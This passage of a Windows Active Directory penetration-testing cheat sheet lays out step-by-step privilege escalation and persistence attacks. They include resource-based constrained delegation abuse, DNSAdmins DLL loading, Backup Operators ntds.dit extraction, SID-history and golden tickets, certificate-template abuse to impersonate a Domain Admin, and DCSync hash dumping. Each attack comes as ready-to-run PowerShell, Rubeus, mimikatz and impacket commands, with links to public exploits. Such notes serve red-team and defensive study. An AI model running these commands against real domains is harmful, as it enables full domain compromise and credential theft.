<p>Tools we are going to use:</p>
<ul>
<li><a data-from-md title='https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon' href='https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon'>PowerView</a></li>
<li><a data-from-md title='https://github.com/Kevin-Robertson/Powermad' href='https://github.com/Kevin-Robertson/Powermad'>Powermad</a></li>
<li><a data-from-md title='https://github.com/GhostPack/Rubeus' href='https://github.com/GhostPack/Rubeus'>Rubeus</a></li>
</ul>
<p>First we need to enter the security context of the user/machine account that has the privileges over the object.<br>
If it is a user account we can use Pass the Hash, RDP, PSCredentials etc.</p>
<p>Exploitation Example:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Import Powermad and use it to create a new MACHINE ACCOUNT
. .\Powermad.ps1
New-MachineAccount -MachineAccount &lt;MachineAccountName&gt; -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose

#Import PowerView and get the SID of our new created machine account
. .\PowerView.ps1
$ComputerSid = Get-DomainComputer &lt;MachineAccountName&gt; -Properties objectsid | Select -Expand objectsid

#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))&quot;
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView
Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

#After that we need to get the RC4 hash of the new machine account's password using Rubeus
Rubeus.exe hash /password:'p@ssword!'

#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus
Rubeus.exe s4u /user:&lt;MachineAccountName&gt; /rc4:&lt;RC4HashOfMachineAccountPassword&gt; /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt

#Finally we can access the C$ drive of the target machine
dir \\TargetMachine.wtver.domain\C$</pre><pre class="hljs"><code><span class="hljs-comment">#Import Powermad and use it to create a new MACHINE ACCOUNT</span>
. .\Powermad.ps1
<span class="hljs-built_in">New-MachineAccount</span> <span class="hljs-literal">-MachineAccount</span> &lt;MachineAccountName&gt; <span class="hljs-literal">-Password</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;p@ssword!&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>) <span class="hljs-literal">-Verbose</span>

<span class="hljs-comment">#Import PowerView and get the SID of our new created machine account</span>
. .\PowerView.ps1
<span class="hljs-variable">$ComputerSid</span> = <span class="hljs-built_in">Get-DomainComputer</span> &lt;MachineAccountName&gt; <span class="hljs-literal">-Properties</span> objectsid | <span class="hljs-built_in">Select</span> <span class="hljs-literal">-Expand</span> objectsid

<span class="hljs-comment">#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:</span>
<span class="hljs-variable">$SD</span> = <span class="hljs-built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<span class="hljs-variable">$</span>(<span class="hljs-variable">$ComputerSid</span>))&quot;</span>
<span class="hljs-variable">$SDBytes</span> = <span class="hljs-built_in">New-Object</span> byte[] (<span class="hljs-variable">$SD</span>.BinaryLength)
<span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>, <span class="hljs-number">0</span>)

<span class="hljs-comment">#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we&#x27;re taking over, again using PowerView</span>
<span class="hljs-built_in">Get-DomainComputer</span> TargetMachine | <span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Set</span> <span class="hljs-selector-tag">@</span>{<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>} <span class="hljs-literal">-Verbose</span>

<span class="hljs-comment">#After that we need to get the RC4 hash of the new machine account&#x27;s password using Rubeus</span>
Rubeus.exe hash /password:<span class="hljs-string">&#x27;p@ssword!&#x27;</span>

<span class="hljs-comment">#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus</span>
Rubeus.exe s4u /user:&lt;MachineAccountName&gt; /rc4:&lt;RC4HashOfMachineAccountPassword&gt; /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt

<span class="hljs-comment">#Finally we can access the C$ drive of the target machine</span>
<span class="hljs-built_in">dir</span> \\TargetMachine.wtver.domain\C<span class="hljs-variable">$</span></code></pre></div>
<p>Detailed Articles:</p>
<ul>
<li><a data-from-md title='https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html' href='https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html'>Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory</a></li>
<li><a data-from-md title='https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/' href='https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/'>RESOURCE-BASED CONSTRAINED DELEGATION ABUSE</a></li>
</ul>
<p>:exclamation: In Constrain and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick &quot;tgt::deleg&quot; from kekeo or &quot;tgtdeleg&quot; from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Command on Rubeus
Rubeus.exe tgtdeleg /nowrap</pre><pre class="hljs"><code><span class="hljs-comment">#Command on Rubeus</span>
Rubeus.exe tgtdeleg /nowrap</code></pre></div>
<p>Detailed Article:<br>
<a data-from-md title='https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/' href='https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/'>Rubeus – Now With More Kekeo</a></p>
<h3 id="dnsadmins-abuse">DNSAdmins Abuse</h3>
<p><em>WUT IS DIS ?: If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work.</em></p>
<ol>
<li>
<p>Enumerate the members of the DNSAdmins group:</p>
<ul>
<li>PowerView: <code class="inline-code">Get-NetGroupMember -GroupName &quot;DNSAdmins&quot;</code></li>
<li>AD Module: <code class="inline-code">Get-ADGroupMember -Identiny DNSAdmins</code></li>
</ul>
</li>
<li>
<p>Once we found a member of this group we need to compromise it (There are many ways).</p>
</li>
<li>
<p>Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Using dnscmd:
dnscmd &lt;NameOfDNSMAchine&gt; /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll

#Restart the DNS Service:
sc \\DNSServer stop dns
sc \\DNSServer start dns</pre><pre class="hljs"><code><span class="hljs-comment">#Using dnscmd:</span>
dnscmd &lt;NameOfDNSMAchine&gt; /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll

<span class="hljs-comment">#Restart the DNS Service:</span>
<span class="hljs-built_in">sc</span> \\DNSServer stop dns
<span class="hljs-built_in">sc</span> \\DNSServer <span class="hljs-built_in">start</span> dns</code></pre></div>
</li>
</ol>
<h3 id="abusing-active-directory-integraded-dns">Abusing Active Directory-Integraded DNS</h3>
<ul>
<li><a data-from-md title='https://blog.netspi.com/exploiting-adidns/' href='https://blog.netspi.com/exploiting-adidns/'>Exploiting Active Directory-Integrated DNS</a></li>
<li><a data-from-md title='https://blog.netspi.com/adidns-revisited/' href='https://blog.netspi.com/adidns-revisited/'>ADIDNS Revisited</a></li>
<li><a data-from-md title='https://github.com/Kevin-Robertson/Inveigh' href='https://github.com/Kevin-Robertson/Inveigh'>Inveigh</a></li>
</ul>
<h3 id="abusing-backup-operators-group">Abusing Backup Operators Group</h3>
<p><em>WUT IS DIS ?: If we manage to compromise a user account that is member of the Backup Operators<br>
group, we can then abuse it's SeBackupPrivilege to create a shadow copy of the current state of the DC,<br>
extract the ntds.dit database file, dump the hashes and escalate our privileges to DA.</em></p>
<ol>
<li>
<p>Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Create a .txt file that will contain the shadow copy process script
Script -&gt;{
set context persistent nowriters
set metadata c:\windows\system32\spool\drivers\color\example.cab
set verbose on
begin backup
add volume c: alias mydrive

create

expose %mydrive% w:
end backup
}

#Execute diskshadow with our script as parameter
diskshadow /s script.txt</pre><pre class="hljs"><code><span class="hljs-comment">#Create a .txt file that will contain the shadow copy process script</span>
Script -&gt;{
<span class="hljs-built_in">set</span> context persistent nowriters
<span class="hljs-built_in">set</span> metadata c:\windows\system32\spool\drivers\color\example.cab
<span class="hljs-built_in">set</span> verbose on
<span class="hljs-keyword">begin</span> backup
add volume c: alias mydrive

create

expose %mydrive% w:
<span class="hljs-keyword">end</span> backup
}

<span class="hljs-comment">#Execute diskshadow with our script as parameter</span>
diskshadow /s script.txt</code></pre></div>
</li>
<li>
<p>Next we need to access the shadow copy, we may have the SeBackupPrivilege but we cant just<br>
simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are<br>
going to use <a data-from-md title='https://github.com/giuliano108/SeBackupPrivilege' href='https://github.com/giuliano108/SeBackupPrivilege'>this</a> amazing repo:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Importing both dlls from the repo using powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll

#Checking if the SeBackupPrivilege is enabled
Get-SeBackupPrivilege

#If it isn't we enable it
Set-SeBackupPrivilege

#Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\&lt;PathToSave&gt;\ntds.dit -Overwrite

#Dump the SYSTEM hive
reg save HKLM\SYSTEM c:\temp\system.hive</pre><pre class="hljs"><code><span class="hljs-comment">#Importing both dlls from the repo using powershell</span>
<span class="hljs-built_in">Import-Module</span> .\SeBackupPrivilegeCmdLets.dll
<span class="hljs-built_in">Import-Module</span> .\SeBackupPrivilegeUtils.dll

<span class="hljs-comment">#Checking if the SeBackupPrivilege is enabled</span>
<span class="hljs-built_in">Get-SeBackupPrivilege</span>

<span class="hljs-comment">#If it isn&#x27;t we enable it</span>
<span class="hljs-built_in">Set-SeBackupPrivilege</span>

<span class="hljs-comment">#Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice</span>
<span class="hljs-built_in">Copy-FileSeBackupPrivilege</span> w:\windows\NTDS\ntds.dit c:\&lt;PathToSave&gt;\ntds.dit <span class="hljs-literal">-Overwrite</span>

<span class="hljs-comment">#Dump the SYSTEM hive</span>
reg save HKLM\SYSTEM c:\temp\system.hive</code></pre></div>
</li>
<li>
<p>Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.</p>
</li>
<li>
<p>Use secretsdump.py from impacket and dump the hashes.</p>
</li>
<li>
<p>Use psexec or another tool of your choice to PTH and get Domain Admin access.</p>
</li>
</ol>
<h3 id="abusing-exchange">Abusing Exchange</h3>
<ul>
<li><a data-from-md title='https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/' href='https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/'>Abusing Exchange one Api call from DA</a></li>
<li><a data-from-md title='https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys' href='https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys'>CVE-2020-0688</a></li>
<li><a data-from-md title='https://github.com/dirkjanm/PrivExchange' href='https://github.com/dirkjanm/PrivExchange'>PrivExchange</a> Exchange your privileges for Domain Admin privs by abusing Exchange</li>
</ul>
<h3 id="weaponizing-printer-bug">Weaponizing Printer Bug</h3>
<ul>
<li><a data-from-md title='https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/' href='https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/'>Printer Server Bug to Domain Administrator</a></li>
<li><a data-from-md title='https://github.com/NotMedic/NetNTLMtoSilverTicket' href='https://github.com/NotMedic/NetNTLMtoSilverTicket'>NetNTLMtoSilverTicket</a></li>
</ul>
<h3 id="abusing-acls">Abusing ACLs</h3>
<ul>
<li><a data-from-md title='https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/' href='https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/'>Escalating privileges with ACLs in Active Directory</a></li>
<li><a data-from-md title='https://github.com/fox-it/aclpwn.py' href='https://github.com/fox-it/aclpwn.py'>aclpwn.py</a></li>
<li><a data-from-md title='https://github.com/fox-it/Invoke-ACLPwn' href='https://github.com/fox-it/Invoke-ACLPwn'>Invoke-ACLPwn</a></li>
</ul>
<h3 id="abusing-ipv6-with-mitm6">Abusing IPv6 with mitm6</h3>
<ul>
<li><a data-from-md title='https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/' href='https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/'>Compromising IPv4 networks via IPv6</a></li>
<li><a data-from-md title='https://github.com/fox-it/mitm6' href='https://github.com/fox-it/mitm6'>mitm6</a></li>
</ul>
<h3 id="sid-history-abuse">SID History Abuse</h3>
<p><em>WUT IS DIS?: If we manage to compromise a child domain of a forest and <a data-from-md title='https://www.itprotoday.com/windows-8/sid-filtering' href='https://www.itprotoday.com/windows-8/sid-filtering'>SID filtering</a> isn't enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the <a data-from-md title='https://www.itprotoday.com/windows-8/sid-history' href='https://www.itprotoday.com/windows-8/sid-history'>SID History</a> field on a kerberos TGT ticket, that defines the &quot;extra&quot; security groups and privileges.</em></p>
<p>Exploitation example:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Get the SID of the Current Domain using PowerView
Get-DomainSID -Domain current.root.domain.local

#Get the SID of the Root Domain using PowerView
Get-DomainSID -Domain root.domain.local

#Create the Enteprise Admins SID
Format: RootDomainSID-519

#Forge &quot;Extra&quot; Golden Ticket using mimikatz
kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:&lt;CurrentDomainSID&gt; /krbtgt:&lt;krbtgtHash&gt; /sids:&lt;EnterpriseAdminsSID&gt; /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi

#Inject the ticket into memory
kerberos::ptt \path\to\ticket\golden.kirbi

#List the DC of the Root Domain
dir \\dc.root.domain.local\C$

#Or DCsync and dump the hashes using mimikatz
lsadump::dcsync /domain:root.domain.local /all</pre><pre class="hljs"><code><span class="hljs-comment">#Get the SID of the Current Domain using PowerView</span>
<span class="hljs-built_in">Get-DomainSID</span> <span class="hljs-literal">-Domain</span> current.root.domain.local

<span class="hljs-comment">#Get the SID of the Root Domain using PowerView</span>
<span class="hljs-built_in">Get-DomainSID</span> <span class="hljs-literal">-Domain</span> root.domain.local

<span class="hljs-comment">#Create the Enteprise Admins SID</span>
Format: RootDomainSID<span class="hljs-literal">-519</span>

<span class="hljs-comment">#Forge &quot;Extra&quot; Golden Ticket using mimikatz</span>
kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:&lt;CurrentDomainSID&gt; /krbtgt:&lt;krbtgtHash&gt; /sids:&lt;EnterpriseAdminsSID&gt; /startoffset:<span class="hljs-number">0</span> /endin:<span class="hljs-number">600</span> /renewmax:<span class="hljs-number">10080</span> /ticket:\path\to\ticket\golden.kirbi

<span class="hljs-comment">#Inject the ticket into memory</span>
kerberos::ptt \path\to\ticket\golden.kirbi

<span class="hljs-comment">#List the DC of the Root Domain</span>
<span class="hljs-built_in">dir</span> \\dc.root.domain.local\C<span class="hljs-variable">$</span>

<span class="hljs-comment">#Or DCsync and dump the hashes using mimikatz</span>
lsadump::dcsync /domain:root.domain.local /all</code></pre></div>
<p>Detailed Articles:</p>
<ul>
<li><a data-from-md title='https://adsecurity.org/?p=1640' href='https://adsecurity.org/?p=1640'>Kerberos Golden Tickets are Now More Golden</a></li>
<li><a data-from-md title='http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/' href='http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/'>A Guide to Attacking Domain Trusts</a></li>
</ul>
<h3 id="exploiting-sharepoint">Exploiting SharePoint</h3>
<ul>
<li><a data-from-md title='https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d' href='https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d'>CVE-2019-0604</a> RCE Exploitation <br>
<a data-from-md title='https://github.com/k8gege/CVE-2019-0604' href='https://github.com/k8gege/CVE-2019-0604'>PoC</a></li>
<li><a data-from-md title='https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization' href='https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization'>CVE-2019-1257</a> Code execution through BDC deserialization</li>
<li><a data-from-md title='https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters' href='https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters'>CVE-2020-0932</a> RCE using typeconverters <br>
<a data-from-md title='https://github.com/thezdi/PoC/tree/master/CVE-2020-0932' href='https://github.com/thezdi/PoC/tree/master/CVE-2020-0932'>PoC</a></li>
</ul>
<h3 id="zerologon">Zerologon</h3>
<ul>
<li><a data-from-md title='https://www.secura.com/whitepapers/zerologon-whitepaper' href='https://www.secura.com/whitepapers/zerologon-whitepaper'>Zerologon: Unauthenticated domain controller compromise</a>: White paper of the vulnerability.</li>
<li><a data-from-md title='https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon' href='https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon'>SharpZeroLogon</a>: C# implementation of the Zerologon exploit.</li>
<li><a data-from-md title='https://github.com/BC-SECURITY/Invoke-ZeroLogon' href='https://github.com/BC-SECURITY/Invoke-ZeroLogon'>Invoke-ZeroLogon</a>: PowerShell implementation of the Zerologon exploit.</li>
<li><a data-from-md title='https://github.com/bb00/zer0dump' href='https://github.com/bb00/zer0dump'>Zer0Dump</a>: Python implementation of the Zerologon exploit using the impacket library.</li>
</ul>
<h3 id="printnightmare">PrintNightmare</h3>
<ul>
<li><a data-from-md title='https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527' href='https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527'>CVE-2021-34527</a>: Vulnerability details.</li>
<li><a data-from-md title='https://github.com/cube0x0/CVE-2021-1675' href='https://github.com/cube0x0/CVE-2021-1675'>Impacket implementation of PrintNightmare</a>: Reliable PoC of PrintNightmare using the impacket library.</li>
<li><a data-from-md title='https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare' href='https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare'>C# Implementation of CVE-2021-1675</a>: Reliable PoC of PrintNightmare written in C#.</li>
</ul>
<h3 id="active-directory-certificate-services">Active Directory Certificate Services</h3>
<p><strong>Check for Vulnerable Certificate Templates with:</strong> <a data-from-md title='https://github.com/GhostPack/Certify' href='https://github.com/GhostPack/Certify'>Certify</a></p>
<p><em>Note: Certify can be executed with Cobalt Strike's <code class="inline-code">execute-assembly</code> command as well</em></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">.\Certify.exe find /vulnerable /quiet</pre><pre class="hljs"><code>.\Certify.exe find /vulnerable /quiet</code></pre></div>
<p>Make sure the msPKI-Certificates-Name-Flag value is set to &quot;ENROLLEE_SUPPLIES_SUBJECT&quot; and that the Enrollment Rights<br>
allow Domain/Authenticated Users. Additionally, check that the pkiextendedkeyusage parameter contains the &quot;Client Authentication&quot; value as well as that the &quot;Authorized Signatures Required&quot; parameter is set to 0.</p>
<p>This exploit only works because these settings enable server/client authentication, meaning an attacker can specify the UPN of a Domain Admin (&quot;DA&quot;)<br>
and use the captured certificate with Rubeus to forge authentication.</p>
<p><em>Note: If a Domain Admin is in a Protected Users group, the exploit may not work as intended. Check before choosing a DA to target.</em></p>
<p>Request the DA's Account Certificate with Certify</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">.\Certify.exe request /template:&lt;Template Name&gt; /quiet /ca:&quot;&lt;CA Name&gt;&quot; /domain:&lt;domain.com&gt; /path:CN=Configuration,DC=&lt;domain&gt;,DC=com /altname:&lt;Domain Admin AltName&gt; /machine</pre><pre class="hljs"><code>.\Certify.exe request /template:&lt;Template Name&gt; /quiet /ca:<span class="hljs-string">&quot;&lt;CA Name&gt;&quot;</span> /domain:&lt;domain.com&gt; /path:CN=Configuration,DC=&lt;domain&gt;,DC=com /altname:&lt;Domain Admin AltName&gt; /machine</code></pre></div>
<p>This should return a valid certificate for the associated DA account.</p>
<p>The exported <code class="inline-code">cert.pem</code> and <code class="inline-code">cert.key</code> files must be consolidated into a single <code class="inline-code">cert.pem</code> file, with one gap of whitespace between the <code class="inline-code">END RSA PRIVATE KEY</code> and the <code class="inline-code">BEGIN CERTIFICATE</code>.</p>
<p><em>Example of <code class="inline-code">cert.pem</code>:</em></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">-----BEGIN RSA PRIVATE KEY-----
BIIEogIBAAk15x0ID[...]
[...]
[...]
-----END RSA PRIVATE KEY-----

-----BEGIN CERTIFICATE-----
BIIEogIBOmgAwIbSe[...]
[...]
[...]
-----END CERTIFICATE-----</pre><pre class="hljs"><code><span class="hljs-params">-----BEGIN</span> RSA PRIVATE KEY<span class="hljs-params">-----</span>
BIIEogIBAAk15x0ID[<span class="hljs-string">...</span>]
[<span class="hljs-string">...</span>]
[<span class="hljs-string">...</span>]
<span class="hljs-params">-----END</span> RSA PRIVATE KEY<span class="hljs-params">-----</span>

<span class="hljs-params">-----BEGIN</span> CERTIFICATE<span class="hljs-params">-----</span>
BIIEogIBOmgAwIbSe[<span class="hljs-string">...</span>]
[<span class="hljs-string">...</span>]
[<span class="hljs-string">...</span>]
<span class="hljs-params">-----END</span> CERTIFICATE<span class="hljs-params">-----</span></code></pre></div>
<p>#Utilize <code class="inline-code">openssl</code> to Convert to PKCS #12 Format</p>
<p>The <code class="inline-code">openssl</code> command can be utilized to convert the certificate file into PKCS #12 format (you may be required to enter an export password, which can be anything you like).</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="bash" data-joplin-source-open="```bash&#10;" data-joplin-source-close="&#10;```">openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</pre><pre class="hljs"><code>openssl pkcs12 -<span class="hljs-keyword">in</span> cert.pem -keyex -CSP <span class="hljs-string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> -<span class="hljs-built_in">export</span> -out cert.pfx</code></pre></div>
<p>Once the <code class="inline-code">cert.pfx</code> file has been exported, upload it to the compromised host (this can be done in a variety of ways, such as with Powershell, SMB, <code class="inline-code">certutil.exe</code>, Cobalt Strike's upload functionality, etc.)</p>
<p>After the <code class="inline-code">cert.pfx</code> file has been uploaded to the compromised host, <a data-from-md title='https://github.com/GhostPack/Rubeus' href='https://github.com/GhostPack/Rubeus'>Rubeus</a> can be used to request a Kerberos TGT for the DA account which will then be imported into memory.</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">.\Rubeus.exe asktht /user:&lt;Domain Admin AltName&gt; /domain:&lt;domain.com&gt; /dc:&lt;Domain Controller IP or Hostname&gt; /certificate:&lt;Local Machine Path to cert.pfx&gt; /nowrap /ptt</pre><pre class="hljs"><code>.\Rubeus.exe asktht /user:&lt;Domain Admin AltName&gt; /domain:&lt;domain.com&gt; /dc:&lt;Domain Controller IP or Hostname&gt; /certificate:&lt;Local Machine Path to cert.pfx&gt; /nowrap /ptt</code></pre></div>
<p>This should result in a successfully imported ticket, which then enables an attacker to perform various malicious acitivities under DA user context, such as performing a DCSync attack.</p>
<h3 id="no-pac">No PAC</h3>
<ul>
<li><a data-from-md title='https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing' href='https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing'>sAMAccountname Spoofing</a> Exploitation of CVE-2021-42278 and CVE-2021-42287</li>
<li><a data-from-md title='https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html' href='https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html'>Weaponisation of CVE-2021-42287/CVE-2021-42278</a> Exploitation of CVE-2021-42278 and CVE-2021-42287</li>
<li><a data-from-md title='https://github.com/cube0x0/noPac' href='https://github.com/cube0x0/noPac'>noPAC</a> C# tool to exploit CVE-2021-42278 and CVE-2021-42287</li>
<li><a data-from-md title='https://github.com/WazeHell/sam-the-admin' href='https://github.com/WazeHell/sam-the-admin'>sam-the-admin</a> Python automated tool to exploit CVE-2021-42278 and CVE-2021-42287</li>
<li><a data-from-md title='https://github.com/Ridter/noPac' href='https://github.com/Ridter/noPac'>noPac</a> Evolution of &quot;sam-the-admin&quot; tool</li>
</ul>
<h2 id="domain-persistence">Domain Persistence</h2>
<h3 id="golden-ticket-attack">Golden Ticket Attack</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Execute mimikatz on DC as DA to grab krbtgt hash:
Invoke-Mimikatz -Command '&quot;lsadump::lsa /patch&quot;' -ComputerName &lt;DC'sName&gt;

#On any machine:
Invoke-Mimikatz -Command '&quot;kerberos::golden /user:Administrator /domain:&lt;DomainName&gt; /sid:&lt;Domain's SID&gt; /krbtgt:
&lt;HashOfkrbtgtAccount&gt;   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt&quot;'</pre><pre class="hljs"><code><span class="hljs-comment">#Execute mimikatz on DC as DA to grab krbtgt hash:</span>
<span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&#x27;&quot;lsadump::lsa /patch&quot;&#x27;</span> <span class="hljs-literal">-ComputerName</span> &lt;DC<span class="hljs-string">&#x27;sName&gt;

#On any machine:
Invoke-Mimikatz -Command &#x27;</span><span class="hljs-string">&quot;kerberos::golden /user:Administrator /domain:&lt;DomainName&gt; /sid:&lt;Domain&#x27;s SID&gt; /krbtgt:
&lt;HashOfkrbtgtAccount&gt;   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt&quot;</span><span class="hljs-string">&#x27;</span></code></pre></div>
<h3 id="dcsync-attack">DCsync Attack</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):
Invoke-Mimikatz -Command '&quot;lsadump::dcsync /user:&lt;DomainName&gt;\&lt;AnyDomainUser&gt;&quot;'

#DCsync using secretsdump.py from impacket with NTLM authentication
secretsdump.py &lt;Domain&gt;/&lt;Username&gt;:&lt;Password&gt;@&lt;DC'S IP or FQDN&gt; -just-dc-ntlm

#DCsync using secretsdump.py from impacket with Kerberos Authentication
secretsdump.py -no-pass -k &lt;Domain&gt;/&lt;Username&gt;@&lt;DC'S IP or FQDN&gt; -just-dc-ntlm</pre><pre class="hljs"><code><span class="hljs-comment">#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):</span>
<span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&#x27;&quot;lsadump::dcsync /user:&lt;DomainName&gt;\&lt;AnyDomainUser&gt;&quot;&#x27;</span>

<span class="hljs-comment">#DCsync using secretsdump.py from impacket with NTLM authentication</span>
